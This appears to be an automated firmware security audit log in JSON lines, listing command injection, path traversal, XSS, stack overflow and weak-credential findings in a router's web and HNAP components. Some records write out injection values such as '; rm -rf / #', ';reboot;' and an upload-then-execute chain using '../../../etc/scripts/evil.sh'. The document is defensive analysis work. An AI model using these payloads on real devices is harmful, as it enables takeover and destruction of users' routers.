{"name": "pending_analysis-dws_api-GetFile", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 6.0, "confidence": 6.0, "description": "The API endpoint to be verified: /dws/api/GetFile.php. As the final processing module for front-end search_box input, its validation logic for the path/filename parameters needs to be analyzed. Potential risks include path traversal or command injection, depending on how the parameters are processed.", "link_identifiers": ["GetFile", "dws/api", "path", "filename"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "path-traversal-folder-creation", "file_path": "REDACTED_SENSITIVE_DATA", "location": "folder_view.php (JavaScript[HIDDEN])", "risk_score": 8.0, "confidence": 8.75, "description": "The folder creation function has a path traversal vulnerability: the user controls the folder name through the folder_name parameter. While the frontend filters using the regular expression /[\\\\/:*?\"<>|]/, it fails to handle '../' sequences. The dangerous operation lies in path concatenation: 'path=' + current_path + '&dirname=' + folder_name. An attacker could construct folder names like '../../etc', potentially bypassing frontend checks to access sensitive system directories. Trigger condition: when a user submits a folder creation request containing path traversal sequences in the folder name.", "code_snippet": "var para = \"AddDir?id=\" + ... + \"&path=\" + REDACTED_SECRET_KEY_PLACEHOLDER_modify(current_path);\npara += \"&dirname=\" + REDACTED_SECRET_KEY_PLACEHOLDER_modify(folder_name);", "link_identifiers": ["folder_name", "current_path", "AddDir", "check_special_char", "re=/[\\\\/:*?\"<>|]/", "REDACTED_SECRET_KEY_PLACEHOLDER_modify"], "notes": "It is necessary to verify whether the /dws/api/AddDir backend implements path normalization. The current_path may be controlled via cookies or URL parameters (further tracking required). Related knowledge base keywords: /dws/api/, AddDir"}
{"name": "file-upload-multiple-vulns", "file_path": "REDACTED_SENSITIVE_DATA", "location": "folder_view.php (upload_ajax & check_upload_file[HIDDEN])", "risk_score": 9.0, "confidence": 9.25, "description": "The file upload functionality presents dual risks: 1) Absence of file type whitelist validation enables RCE through crafted .php files 2) Path concatenation employs REDACTED_SECRET_KEY_PLACEHOLDER_modify but contains logical flaws. AJAX method (upload_ajax) directly transmitting FormData may bypass checks, while form submission (check_upload_file) exposes filename parameter. Trigger condition: Uploading malicious files and executing via web directory.", "code_snippet": "fd.append(\"filename\", REDACTED_SECRET_KEY_PLACEHOLDER_modify(file_name));", "link_identifiers": ["upload_ajax", "check_upload_file", "FormData", "fd.append(\"filename\")", "UploadFile", "get_by_id(\"filename\").value"], "notes": "Analyze the backend implementation of /dws/api/UploadFile. Edge browser >4GB file upload anomalies may trigger DoS. Related knowledge base keywords: UploadFile, /dws/api/, FormData"}
{"name": "custom-encoding-ambiguity", "file_path": "REDACTED_SENSITIVE_DATA", "location": "folder_view.php (REDACTED_SECRET_KEY_PLACEHOLDER_modify[HIDDEN])", "risk_score": 6.0, "confidence": 7.25, "description": "The custom encoding function `REDACTED_SECRET_KEY_PLACEHOLDER_modify` carries a parsing ambiguity risk: When handling single quotes, it uses `split(\"'\")` to divide the string without considering escape scenarios. Attackers could construct filenames containing consecutive single quotes (e.g., `a''b`) to disrupt path structures. Trigger condition: Uploading/creating filenames containing abnormal quote sequences.", "code_snippet": "if (for_encode_str.match(\"'\") > -1) {\n  var tmp_split = split_str.split(\"'\");\n  ...\n  encode_space +=\"%27\";\n}", "link_identifiers": ["REDACTED_SECRET_KEY_PLACEHOLDER_modify", "split_str.split(\"'\")", "encode_space +=\"%27\""], "notes": "May be used to construct non-standard encoded paths and requires validation with backend decoding logic. Related knowledge base keywords: REDACTED_SECRET_KEY_PLACEHOLDER_modify"}
{"name": "pending_analysis-dws_api-ListCategory", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 6.0, "confidence": 6.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["ListCategory", "dws/api", "path"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "analysis-status-command-injection-chain", "file_path": "REDACTED_SENSITIVE_DATA", "location": "[HIDDEN]", "risk_score": 0.0, "confidence": 5.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["PHYINF_setup", "INF_getinfpath", "XNODE_getpathbytarget", "$inf", "$UID", "command_execution"], "notes": "Core Requirement Correlation: This status impacts the validation of complete attack paths (user's core objective). Before resolution, the practical feasibility assessment of the attack chain is constrained."}
{"name": "negative_finding-photo.php-static_content", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 0.0, "confidence": 5.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["static_html", "no_server_side", "photo.php", "category_view.php", "index.php"], "notes": "Mark the following records in the knowledge base as invalid: command_injection-photo.php-ip_param, xss-photo_media_list-1, xss-filename-html-output, path-traversal-GetFileAPI, localStorage-language-leak. Subsequent analysis will focus on: 1) Dynamic files in the same directory: index.php/category_view.php 2) CGI script directory: /www/cgi-bin/"}
{"name": "network_input-firmware_upgrade-xss_REDACTED_SECRET_KEY_PLACEHOLDER.xml_7", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SECRET_KEY_PLACEHOLDER.xml:7", "risk_score": 7.0, "confidence": 6.5, "description": "The $result variable is directly embedded in the SOAP response template (location: REDACTED_SECRET_KEY_PLACEHOLDER.xml:7). If $result is contaminated (e.g., via the included config.php), an attacker could inject malicious scripts to trigger stored XSS. Trigger condition: when the client initiates an HNAP upgrade request and the response is rendered. Boundary check: the current file does not perform any filtering or encoding on $result. Potential impact: theft of HNAP session cookies or spoofing of upgrade status. Exploitation method: control the $result value to inject <script>payload</script>.", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "$result", "REDACTED_SENSITIVE_DATA"], "notes": "Verify whether the assignment logic of $result in config.php is affected by external input; the associated keyword $result already exists in the knowledge base."}
{"name": "REDACTED_SENSITIVE_DATA", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 8.0, "confidence": 8.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "<RemoteMgtPort></RemoteMgtPort>\n<InboundFilter></InboundFilter>", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "RemoteMgtPort", "InboundFilter", "http://purenetworks.com/HNAP1/", "SOAPAction"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-REDACTED_PASSWORD_PLACEHOLDER-REDACTED_PASSWORD_PLACEHOLDER_exposure", "file_path": "REDACTED_PASSWORD_PLACEHOLDER_PASSWORD_PLACEHOLDER", "location": "REDACTED_PASSWORD_PLACEHOLDER:23", "risk_score": 8.5, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "<REDACTED_PASSWORD_PLACEHOLDER><?if($REDACTED_PASSWORD_PLACEHOLDER==1){echo $REDACTED_PASSWORD_PLACEHOLDER;}?></REDACTED_PASSWORD_PLACEHOLDER>", "link_identifiers": ["REDACTED_PASSWORD_PLACEHOLDER", "REDACTED_PASSWORD_PLACEHOLDER", "REDACTED_PASSWORD_PLACEHOLDER", "AUTHORIZED_GROUP", "REDACTED_SENSITIVE_DATA"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-http_header-HTML_gen_301_header", "file_path": "htdocs/phplib/html.php", "location": "htdocs/phplib/html.php:6", "risk_score": 0.8, "confidence": 4.6, "description": "The HTML_gen_301_header function has unfiltered user input risks:\n- Directly uses $_SERVER['HTTP_HOST'] (fully client-controllable) to construct the Location response header when $host is empty\n- Lacks CRLF filtering (%0d%0a) or URL validation, allowing injection of malicious headers or construction of phishing redirects\n- Actual security impact: Cross-verification across multiple directories found no call points, currently no trigger path exists\n- Trigger condition: Only possible when other components call this function without explicitly assigning the $host parameter", "code_snippet": "if ($host == \"\") echo $_SERVER[\"HTTP_HOST\"].$uri;", "link_identifiers": ["HTML_gen_301_header", "$_SERVER", "HTTP_HOST", "$host", "$uri", "Location:"], "notes": "Conclusion: No viable attack path identified (lack of call evidence). Verification required: 1) Dynamic monitoring of HTTP 301 responses 2) Check if firmware initialization loads the library 3) Expand search to unresolved binary files"}
{"name": "configuration_read-log_config-pushevent_log_enable", "file_path": "REDACTED_PASSWORD_PLACEHOLDER_PASSWORD_PLACEHOLDER", "location": "[HIDDEN]:0 ([HIDDEN])", "risk_score": 0.0, "confidence": 4.75, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["query()", "$LOGP", "REDACTED_SENSITIVE_DATA", "config.log_enable"], "notes": "Verification required: 1) Whether the implementation of query() in xnode.php is secure 2) Whether the log modification functionality exists in other ASP files (e.g., set_Logopt.asp). It is recommended to subsequently analyze files related to log configuration modifications. || Related knowledge base notes field record: Special verification is needed for the security of the query() function in xnode.php."}
{"name": "attack_chain-http_param_to_nvram-langcode", "file_path": "htdocs/phplib/slp.php", "location": "slp.php: within function SLP_setlangcode", "risk_score": 8.5, "confidence": 8.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["SLP_setlangcode", "set", "$code", "REDACTED_SENSITIVE_DATA", "ftime"], "notes": "Requires further verification: 1. Confirm whether $code is fully controllable at the upper layer of the call stack (e.g., lang.php) 2. Conduct reverse analysis of set()'s implementation in the binary (buffer boundaries) 3. Trace the implementation of sealpac function in other files (if exists)"}
{"name": "systemic_risk-nvram_set-multi_input_sources", "file_path": "htdocs/phplib/slp.php", "location": "[HIDDEN]htdocs/mydlink/form_wireless.php, htdocs/mydlink/form_wansetting, htdocs/phplib/slp.php[HIDDEN]", "risk_score": 9.0, "confidence": 8.25, "description": "Multiple independent attack chains have been identified where unverified external inputs are written to NVRAM configurations through the set() function, creating systemic risks:\n1. Diverse input sources: Covering HTTP parameters (f_ssid in form_wireless.php), network configurations (PPPOE credentials in form_wansetting), device language ($code in slp.php), etc.\n2. Common vulnerability pattern: All cases lack input value length validation and content filtering\n3. Amplification effect: If the underlying implementation of set() contains buffer overflow vulnerabilities (e.g., in libnvram.so), attackers could trigger memory corruption through any input point\n4. Actual impact: A single vulnerability could simultaneously affect critical modules such as wireless configuration, WAN settings, and system localization, significantly increasing the risk of remote code execution", "link_identifiers": ["set", "NVRAM", "[HIDDEN]", "multi_input", "libnvram.so"], "notes": "Correlation Findings: network_input-wireless_config-ssid_injection, network_input-form_wansetting-http_config_injection, attack_chain-http_param_to_nvram-langcode. Subsequent Verification: 1) Reverse analyze the implementation of set() in /usr/sbin/httpd or libnvram.so 2) Confirm the boundary management mechanism of NVRAM storage area."}
{"name": "xss-stored-mydlink-REDACTED_PASSWORD_PLACEHOLDER-web-7_8", "file_path": "REDACTED_PASSWORD_PLACEHOLDER_PASSWORD_PLACEHOLDER", "location": "htdocs/mydlink/form_admin:7 ([HIDDEN]); REDACTED_PASSWORD_PLACEHOLDER_PASSWORD_PLACEHOLDER:8 ([HIDDEN])", "risk_score": 8.0, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "// [HIDDEN] (form_admin)\n$Remote_Admin=$_POST[\"config.web_server_allow_wan_http\"];\nset($WAN1P.\"/web\", $Remote_Admin);\n\n// [HIDDEN] (REDACTED_PASSWORD_PLACEHOLDER)\n<? echo $remoteMngStr; ?>", "link_identifiers": ["$_POST[\"config.web_server_allow_wan_http\"]", "set($WAN1P.\"/web\")", "query(\"web\")", "$remoteMngStr", "echo $remoteMngStr", "/web"], "notes": "Verification of form_admin access permissions required; completeness of attack chain depends on administrator actions; associated risk: the same NVRAM node/web may be exploited via config.web_server_wan_port_http parameter injection (refer to the second finding in the original report); analysis limitation: query function implementation not verified (cross-directory access restricted)."}
{"name": "network_input-HNAP-command_execution", "file_path": "REDACTED_SENSITIVE_DATA", "location": "htdocs/cgibin:0x1e478 & 0x1ca80", "risk_score": 9.5, "confidence": 9.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "snprintf(cmd_buf, 0x3ff, \"rndimage %s\", getenv(\"QUERY_STRING\")+5);\npopen(cmd_buf, \"r\");", "link_identifiers": ["REDACTED_SECRET_KEY_PLACEHOLDER", "SPIIPv4", "REDACTED_SENSITIVE_DATA", "LocalIPAddress", "QUERY_STRING", "popen", "snprintf", "HTTP_SOAPACTION", "system"], "notes": "Verification: Sending a LocalIPAddress containing ';reboot;' causes the device to restart. Subsequent tests required: 1) Effects of executing other commands 2) Stability of SOAPAction header injection 3) Related vulnerabilities: Potential NVRAM contamination triggering secondary firewall vulnerabilities."}
{"name": "configuration_load-IPTABLES-command_injection", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.0, "confidence": 7.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "", "link_identifiers": ["IPTABLES.php", "IPT_newchain", "uid", "system", "NVRAM"], "notes": "Exploitation Chain: HNAP Vulnerability â†’ NVRAM Corruption â†’ Triggering This Vulnerability. Specialized Analysis Required: 1) Interaction Path Between NVRAM and IPTABLES.php 2) Whether REDACTED_SECRET_KEY_PLACEHOLDER Parameters Affect This Module"}
{"name": "network_input-HNAP-REDACTED_SECRET_KEY_PLACEHOLDER", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 0.0, "confidence": 5.0, "description": "REDACTED_SECRET_KEY_PLACEHOLDER.xml only defines an empty operation structure without containing parameters or logic implementation. Trigger condition: Sending SOAP requests via the HNAP protocol. Security impact: Unable to assess (due to unlocated handler), but similar HNAP interfaces have historical vulnerabilities such as authentication bypass/command injection (e.g., CVE-2020-8863). Constraint: Requires association with backend CGI program implementation.", "code_snippet": "<REDACTED_SECRET_KEY_PLACEHOLDER/>", "link_identifiers": ["REDACTED_SECRET_KEY_PLACEHOLDER", "soap:Body", "http://purenetworks.com/HNAP1/"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-HNAP-RouteRisk", "file_path": "REDACTED_SENSITIVE_DATA", "location": "sbin/httpd: ([HIDDEN])", "risk_score": 7.5, "confidence": 7.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "sbin/httpd", "SOAPAction"], "notes": "The evidence points to: 1) Files such as Login.xml define sensitive operations 2) sbin/httpd requires reverse engineering to verify routing logic 3) Dynamic testing is needed for the HNAP interface authentication mechanism"}
{"name": "network_input-xnode-command_injection-XNODE_REDACTED_SECRET_KEY_PLACEHOLDER", "file_path": "htdocs/phplib/xnode.php", "location": "xnode.php:91", "risk_score": 8.0, "confidence": 6.0, "description": "The XNODE_REDACTED_SECRET_KEY_PLACEHOLDER function is vulnerable to command injection. Specific manifestation: The $sch_uid parameter is directly used to construct the 'schedule_2013' system command without validation. Trigger conditions: 1) Upstream web scripts pass tainted data into $sch_uid (e.g., HTTP parameters) 2) Tainted data contains command separators. Missing boundary checks: XNODE_getpathbytarget fails to implement path traversal protection for $sch_uid. Potential impact: Remote Code Execution (RCE), with medium probability of success (requires trigger conditions to be met). Exploitation method: Attackers can control $sch_uid to inject payloads such as '$(malicious_command)'.", "code_snippet": "$sch_path = XNODE_getpathbytarget(\"/schedule\", \"entry\", \"uid\", $sch_uid, 0);", "link_identifiers": ["XNODE_REDACTED_SECRET_KEY_PLACEHOLDER", "$sch_uid", "schedule_2013", "XNODE_getpathbytarget", "/schedule"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "configuration_manipulation-xnode-global_variable_tamper-XNODE_set_var", "file_path": "htdocs/phplib/xnode.php", "location": "xnode.php:150-154", "risk_score": 9.0, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "function XNODE_set_var($name, $value){\n    $path = XNODE_getpathbytarget(...);\n    set($path.\"/value\", $value);\n}", "link_identifiers": ["XNODE_set_var", "XNODE_get_var", "REDACTED_SENSITIVE_DATA", "set", "query"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-WPS-predictable_pin", "file_path": "REDACTED_SENSITIVE_DATA", "location": "public.js:221 [generate_wps_pin]", "risk_score": 8.5, "confidence": 9.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["generate_wps_pin", "Math.random", "compute_pin_checksum", "pin_number", "REDACTED_SENSITIVE_DATA"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-authentication-cleartext_credential", "file_path": "REDACTED_SENSITIVE_DATA", "location": "public.js:809 [exit_index_page]", "risk_score": 7.0, "confidence": 9.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "para = \"request=login&admin_REDACTED_PASSWORD_PLACEHOLDER=\"+ encode_base64(\"REDACTED_PASSWORD_PLACEHOLDER\") + \"&admin_REDACTED_PASSWORD_PLACEHOLDER=\" + encode_base64(\"\");", "link_identifiers": ["exit_index_page", "encode_base64", "admin_REDACTED_PASSWORD_PLACEHOLDER", "admin_REDACTED_PASSWORD_PLACEHOLDER", "para"], "notes": "Verify if the authentication interface accepts empty passwords. Related files: login.htm and authentication CGI; Related knowledge base keyword: $para"}
{"name": "file_read-localization-hardcoded_path", "file_path": "REDACTED_SENSITIVE_DATA", "location": "public.js:94 [load_xml]", "risk_score": 0.5, "confidence": 4.95, "description": "File path handling uses hardcoded paths (e.g., 'xml/multi_lang.xml'), with no path traversal vulnerabilities detected. The commented-out dynamic path construction code 'xml/hints_\" + which_lang + \".xml' exhibits a potentially risky pattern but remains inactive. Security impact: Currently no client-side path traversal risk exists, but similar patterns in other files should be reviewed.", "code_snippet": "lang_xml = load_xml(\"xml/multi_lang.xml\");\n//var help_xml = load_xml(\"xml/hints_\" + which_lang + \".xml\");", "link_identifiers": ["load_xml", "multi_lang.xml", "hints.xml", "which_lang"], "notes": "Dynamic path construction patterns require cross-file review"}
{"name": "command-injection-signalc-fixed-params", "file_path": "mydlink/signalc", "location": "/mydlink/signalc:0 [fcn.0000f9bc]", "risk_score": 0.5, "confidence": 4.9, "description": "Analysis of Command Injection Vulnerability Chain (popen/system calls) Conclusion: Parameter sources are all fixed strings during compilation (e.g., 'set device_recording 0') or read-only data in the .text segment (address 0x13000). Trigger conditions depend on internal state machines, with no external input contamination paths. Actual security impact: Attackers cannot control parameter content, making malicious command injection impossible.", "link_identifiers": ["fcn.0000f9bc", "param_3", "0x13000", "set device_recording", "popen", "system"], "notes": "Associated knowledge base keywords: param_3(etc/events), popen(var/run), system(exec.sh). Isolation verification: no network/NVRAM input path."}
{"name": "stack-overflow-signalc-internal-data", "file_path": "mydlink/signalc", "location": "/mydlink/signalc:0 [fcn.00012e90]", "risk_score": 0.5, "confidence": 4.8, "description": "Analysis conclusion of stack buffer overflow risk (auStack_118): The maximum concatenation length of 264 bytes exceeds the buffer size of 256 bytes, but the parameter sources are fixed values ('SPHTTP' at 0x44308) and read-only data. Trigger condition: Requires passing excessively long parameters, but all calling path parameters are internally generated. Actual security impact: No externally controllable input exists, making it impossible to construct overflow payloads.", "link_identifiers": ["auStack_118", "strcat", "0x44308", "SPHTTP", "fcn.00012e90"], "notes": "Associated knowledge base keywords: strcat(htdocs/webinc). Overflow trigger: internal configuration loading process"}
{"name": "network_input-xml_js-load_xml_xxe", "file_path": "REDACTED_SENSITIVE_DATA", "location": "xml.js (load_xml[HIDDEN])", "risk_score": 7.5, "confidence": 7.0, "description": "A potential XXE vulnerability was identified in the load_xml() function within xml.js. Specific manifestation: When using ActiveXObject('Microsoft.XMLDOM'), security attributes such as ProhibitDTD were not configured, and the async=false synchronous loading mode could amplify attack impact. Trigger conditions: 1) The device uses IE kernel to parse XML 2) The which_one parameter is tainted to point to malicious external entities 3) Parsing server responses. Security impact: Attackers could read arbitrary files or initiate SSRF attacks. Constraints: Only affects IE-compatible environments; modern browsers remain unaffected.", "code_snippet": "my_doc = new ActiveXObject(\"Microsoft.XMLDOM\");\nmy_doc.async = false;\nmy_doc.load(which_one);", "link_identifiers": ["load_xml", "ActiveXObject", "Microsoft.XMLDOM", "which_one", "async"], "notes": "Need further verification: 1) Whether the which_one parameter comes from network input 2) Whether the device firmware includes IE components"}
{"name": "network_input-form_admin-port_tamper", "file_path": "htdocs/mydlink/form_admin", "location": "htdocs/mydlink/form_admin:15", "risk_score": 8.5, "confidence": 8.5, "description": "A high-risk data flow was detected in 'htdocs/mydlink/form_admin': The HTTP parameter 'config.web_server_wan_port_http' (port configuration) is directly assigned from $_POST to $Remote_Admin_Port (line 8). When $Remote_Admin=='true', it is passed to the set() function (line 15) without any validation (length/type/range). Trigger condition: An attacker sends an HTTP POST request containing a malicious port value. Potential impact: If the set() function contains vulnerabilities (such as command injection or buffer overflow), it could lead to remote code execution. Actual exploitability depends on the implementation of set(), but the parameter transmission path is complete and externally triggerable.", "code_snippet": "if($Remote_Admin==\"true\"){\n\tset($WAN1P.\"/web\", $Remote_Admin_Port);\n\t$ret=\"ok\";\n}", "link_identifiers": ["config.web_server_wan_port_http", "$_POST", "$Remote_Admin_Port", "set($WAN1P.\"/web\", $Remote_Admin_Port)", "set()"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "core_lib-xnode-set_function_implementation", "file_path": "htdocs/mydlink/form_admin", "location": "htdocs/phplib/xnode.php:150", "risk_score": 9.5, "confidence": 9.0, "description": "The confirmation of the `set()` function implementation in `htdocs/phplib/xnode.php` reveals a high-risk common pattern: unvalidated external data is directly written to runtime configuration nodes. Specific manifestations: 1) In the `XNODE_set_var` function (line 150), `set($path.\"/value\", $value)` is called directly; 2) In web interfaces such as `form_admin/form_network`, user input is passed to this function without validation. Trigger condition: An attacker controlling upstream parameters (e.g., `$Remote_Admin_Port`/`$lanaddr`) can write to arbitrary configuration nodes. Security impact: a) If `set()` contains a buffer overflow vulnerability (requiring reverse engineering verification), it could lead to RCE; b) Tampering with sensitive configurations (e.g., `/web` nodes) could disrupt services.", "code_snippet": "function XNODE_set_var($name, $value){\n    $path = XNODE_getpathbytarget(...);\n    set($path.\"/value\", $value);\n}", "link_identifiers": ["set()", "XNODE_set_var", "$path.\"/value\"", "$value", "configuration_manipulation-xnode-global_variable_tamper-XNODE_set_var", "network_input-form_admin-port_tamper"], "notes": "Critical evidence chain: 1) Dangerous function shared across multiple paths 2) External input directly accesses core configuration operations. Next steps required: a) Reverse engineer binary implementation of set() in libcmshared.so b) Test whether excessive input (>1024 bytes) triggers buffer overflow c) Verify permission levels of configuration tree nodes"}
{"name": "global_variable-AUTHORIZED_GROUP-undefined_origin", "location": "[HIDDEN]htdocs/web/getcfg.php:20, REDACTED_PASSWORD_PLACEHOLDER_PASSWORD_PLACEHOLDER:23", "risk_score": 7.0, "confidence": 5.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["AUTHORIZED_GROUP", "NVRAM", "config.php", "header.php", "global_variable", "authentication"], "notes": "High-Risk Correlation: This variable governs critical permission verification logic. If its assignment mechanism contains flaws (e.g., loading from untrusted sources), it will lead to a chain of permission bypass vulnerabilities. Urgent verification of its source security is required."}
{"name": "file_permission-stunnel_key-01", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.0, "confidence": 7.75, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "stunnel.conf", "private_key", "TLS_decryption"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "input_validation-radius_secret-01", "file_path": "REDACTED_SENSITIVE_DATA", "location": "public.js:1036-1037", "risk_score": 7.0, "confidence": 6.75, "description": "RADIUS_SERVER.shared_secret processing only validates null values (public.js:1036), without implementing length/character set checks. Combined with the escaping flaw in WEBACCESS.php, malicious credentials can be injected by manipulating RADIUS configuration parameters. Trigger condition: Attacker can modify RADIUS configuration (e.g., via unauthorized API). Actual impact: Authentication system hijacking.", "link_identifiers": ["RADIUS_SERVER", "shared_secret", "WEBACCESS.php", "secret_field"], "notes": ""}
{"name": "crypto_weakness-math_random-01", "file_path": "REDACTED_SENSITIVE_DATA", "location": "public.js:379-419", "risk_score": 6.5, "confidence": 6.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["generate_key_hex", "generate_key_ascii", "Math.random", "get_random_hex_char"], "notes": "Associate existing 'Math.random' keyword discovery (Knowledge Base ID: KF-202405-217)"}
{"name": "library-md5-js-no_hardcoded_hash", "file_path": "REDACTED_SENSITIVE_DATA", "location": "md5.js:rstr2hex[HIDDEN] | [HIDDEN]", "risk_score": 0.0, "confidence": 4.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["hex_tab", "rstr2hex", "String.fromCharCode"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "library-md5-js-no_hardcoded_secrets", "file_path": "REDACTED_SENSITIVE_DATA", "location": "md5.js:[HIDDEN]", "risk_score": 0.0, "confidence": 4.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["hex_tab", "http://pajhome.org.uk/crypt/md5"]}
{"name": "library-md5-js-no_file_validation", "file_path": "REDACTED_SENSITIVE_DATA", "location": "md5.js:[HIDDEN]", "risk_score": 0.0, "confidence": 4.9, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": [], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "analysis_status-HNAP1_index_hnap-empty", "file_path": "htdocs/HNAP1/index.hnap", "location": "htdocs/HNAP1/index.hnap", "risk_score": 0.0, "confidence": 10.0, "description": "The target file htdocs/HNAP1/index.hnap is empty (0 bytes in size), rendering all requested disassembly analysis tasks impossible to execute: 1) devdata calls and 'ALWAYS_TN' searches 2) HTTP header parsing logic localization 3) execv/system call tracing 4) REBOOT command path detection all lack implementation basis. The trigger condition occurs when attempting to analyze this file, as any operation dependent on file content will fail. The security impact is neutral (unable to verify vulnerability existence).", "code_snippet": "File size: 0 bytes (empty)", "link_identifiers": ["index.hnap", "HNAP1"], "notes": "Urgent Recommendations: 1) Use the 'file' command to verify firmware image integrity 2) Focus on inspecting HNAP protocol-related files (e.g., htdocs/HNAP1/soap.c) 3) Confirm the completeness of the firmware extraction process. Related Clues: Existing records related to 'HNAP1' and 'index.hnap' have been identified in the knowledge base (verified via REDACTED_SECRET_KEY_PLACEHOLDER), requiring cross-analysis of protocol implementation."}
{"name": "command_injection-httpd-SERVER_ADDR_1a37c", "file_path": "htdocs/fileaccess.cgi", "location": "fileaccess.cgi:0x1a37c", "risk_score": 9.0, "confidence": 8.75, "description": "Command injection vulnerability: In the function fcn.0001a37c, HTTP environment variables (SERVER_ADDR/SERVER_PORT) are directly concatenated into xmldbc command strings via sprintf without any filtering before being passed to system for execution. Attackers can craft malicious HTTP headers to inject commands (e.g., '; rm -rf / #'). Trigger condition: Sending HTTP requests with contaminated headers to fileaccess.cgi. Boundary check: Completely absent. Security impact: Directly obtains device control with a simple and reliable exploit chain.", "code_snippet": "[[HIDDEN]]", "link_identifiers": ["fcn.0001a37c", "param_1", "sprintf", "system", "xmldbc", "SERVER_ADDR", "SERVER_PORT", "/etc/scripts/wfa_igd_handle.php"], "notes": "The associated function fcn.0000a368 directly uses getenv to retrieve environment variables."}
{"name": "stack_overflow-fileaccess-filename_1c368", "file_path": "htdocs/fileaccess.cgi", "location": "fileaccess.cgi:0x9cfc", "risk_score": 9.5, "confidence": 8.75, "description": "Stack Buffer Overflow (High Risk): In function fcn.0001c368, the filename parameter is copied via strcpy to a fixed-size stack buffer (fp-0x5014, 20504 bytes). When the filename exceeds 2048 bytes, it can precisely overwrite the return address (offset 20508 bytes). Trigger condition: File upload request containing an excessively long filename. Boundary check: Only null value detection, no length validation. Security impact: Remote code execution, combined with upload functionality could deploy ROP chains.", "code_snippet": "[[HIDDEN]]", "link_identifiers": ["filename", "fcn.0001c368", "strcpy", "fp-0x5014", "sprintf", "fcn.0001be84"]}
{"name": "path_traversal-upload-profile_1530c", "file_path": "htdocs/fileaccess.cgi", "location": "fileaccess.cgi:0x1530c", "risk_score": 8.0, "confidence": 7.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "[[HIDDEN]]", "link_identifiers": ["fcn.0001530c", "fcn.0000f674", "strcat", "strncpy", "filename", "profile.sh", "put", "fcn.0000bb34"], "notes": "Dynamic verification of profile.sh's path handling is required."}
{"name": "hardcoded_endpoint-dws_api-uuid", "file_path": "htdocs/fileaccess.cgi", "location": "dws/api:0x0", "risk_score": 6.0, "confidence": 6.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "[[HIDDEN]]", "link_identifiers": ["/dws/api/e00dc989-9c9d-4b9a-a782-f43e58baa0b8", "REDACTED_SECRET_KEY_PLACEHOLDER", "session invalid", "tok="]}
{"name": "exploit_chain-command_injection_path_traversal", "file_path": "htdocs/fileaccess.cgi", "location": "fileaccess.cgi (multi-location)", "risk_score": 9.8, "confidence": 8.25, "description": "exploit_chain: The path traversal vulnerability (fcn.0001530c) enables writing malicious scripts to system directories (e.g., /etc/scripts/), while the command injection vulnerability (fcn.0001a37c) executes said script via tainted HTTP headers. Trigger steps: 1) Upload a malicious file with filename=\"../../../etc/scripts/evil.sh\" 2) Send a SERVER_ADDR header containing '; sh /etc/scripts/evil.sh #'. Exploit probability: Critical (requires no authentication, achieves write+execute in a single request).", "code_snippet": "N/A", "link_identifiers": ["exploit_chain", "command_injection", "path_traversal", "filename", "SERVER_ADDR", "fcn.0001a37c", "fcn.0001530c"], "notes": "exploit_chain"}
